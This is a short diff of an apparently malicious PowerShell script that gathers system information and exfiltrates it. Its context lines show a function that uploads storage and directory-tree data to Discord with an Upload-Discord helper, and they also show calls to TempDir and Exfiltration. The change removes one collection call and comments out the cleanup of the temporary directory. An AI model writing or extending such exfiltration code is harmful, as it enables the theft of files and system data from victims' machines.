@@ -207,9 +207,6 @@ function StorageAndTreeInfo {
     Upload-Discord -file $storageFilePath -text "Storage and Directory Tree Information :"
 }
 
-# Call the StorageAndTreeInfo function
-StorageAndTreeInfo
-
 
 
 # Function to get network information
@@ -520,4 +517,4 @@ TempDir
 Exfiltration
 
 # Call DelTempDir
-DelTempDir
+#DelTempDir
